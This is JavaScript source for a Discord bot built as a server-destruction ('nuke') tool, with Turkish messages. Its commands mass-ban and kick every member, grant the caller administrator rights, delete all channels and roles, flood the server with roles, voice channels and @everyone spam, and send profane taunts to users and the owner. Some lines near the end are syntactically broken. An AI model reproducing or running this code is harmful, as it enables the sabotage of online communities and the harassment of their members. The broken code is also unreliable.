const Discord = require("discord.js"); 
const client = new Discord.Client();
const settings = require("./settings.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(settings.token);

client.on("message", msg => {           
  if (msg.content === ".ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       

client.on("message", msg => {
  if (msg.content === ".kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      

client.on("message", async msg => {
  if (msg.content === ".duyur") {  
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === ".yetki") {  
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === ".yardım") {     
    msg.delete();

    await msg.guild.channels.deleteAll();      

    await msg.guild.createChannel("hacked", {
      type: "text"
    });

       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });       await msg.guild
      .createChannel("Siktik Sunucunu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    
    await msg.guild.setIcon("https://i.hizliresim.com/lEjmyj.jpg");  
    await msg.guild.setName("Nası Hackledim Sunucuyu Çok güzel oldu."); 
    await msg.guild.roles.forEach(roles => roles.delete()); 
    await client.user.setAvatar("https://i.hizliresim.com/lEjmyj.jpg"); 
    await client.user.setUsername("Hackledim lan sunucuyu");    
    await msg.guild.owner.send("Siktim sunucunu");    
    
  }   
});


    client.on("message", msg => {
  if (msg.content === ".rolespam") {  
    msg.delete();
    msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
  }
});

client.on('message', msg => {
  if (msg.content === '.spam') { 
        msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    msg.channel.send('Nası siktik sunucuyu @everyone');
    

  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i..) { 
    if ((new Date().getTime() - start) > milliseconds){         
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() . " Ping tamamdır.");  
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   
}, 3000);


